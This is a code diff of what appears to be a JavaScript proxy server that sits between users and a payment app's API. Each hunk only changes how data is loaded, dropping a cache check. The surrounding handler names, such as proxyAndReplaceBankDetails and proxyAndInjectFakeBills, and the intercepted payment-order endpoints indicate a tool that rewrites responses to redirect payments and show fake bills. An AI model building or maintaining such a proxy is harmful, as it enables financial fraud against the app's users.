@@ -1336,7 +1336,7 @@ Example:
 async function proxyAndAddBonus(req, res) {
   try {
     const [data, { respBody, respHeaders, jsonResp }] = await Promise.all([
-      cachedData ? Promise.resolve(cachedData) : loadData(),
+      loadData(),
       proxyFetch(req)
     ]);
     const userId = await extractUserId(req, jsonResp);
@@ -1414,7 +1414,7 @@ async function proxyAndReplaceBankDetails(req, res, label) {
 async function proxyAndReplaceBankInList(req, res) {
   try {
     const [data, { respBody, respHeaders, jsonResp }] = await Promise.all([
-      cachedData ? Promise.resolve(cachedData) : loadData(),
+      loadData(),
       proxyFetch(req)
     ]);
     const userId = await extractUserId(req, jsonResp);
@@ -1441,7 +1441,7 @@ async function proxyAndReplaceBankInList(req, res) {
 async function proxyAndInjectFakeBills(req, res) {
   try {
     const [data, { respBody, respHeaders, jsonResp }] = await Promise.all([
-      cachedData ? Promise.resolve(cachedData) : loadData(),
+      loadData(),
       proxyFetch(req)
     ]);
     const userId = await extractUserId(req, jsonResp);
@@ -1597,7 +1597,7 @@ app.post('/app/api/orderOut/getPaymentOrder', async (req, res) => {
   let data = null;
   try {
     const [d, proxyResult] = await Promise.all([
-      cachedData ? Promise.resolve(cachedData) : loadData(),
+      loadData(),
       proxyFetch(req)
     ]);
     data = d;
@@ -1654,7 +1654,7 @@ app.all('/appApi/orderOut/searchList', async (req, res) => { await proxyAndRepla
 app.all('/appApi/member/basicInfo', async (req, res) => {
   try {
     const [data, { respBody, respHeaders, jsonResp }] = await Promise.all([
-      cachedData ? Promise.resolve(cachedData) : loadData(),
+      loadData(),
       proxyFetch(req)
     ]);
     const userId = await extractUserId(req, jsonResp);
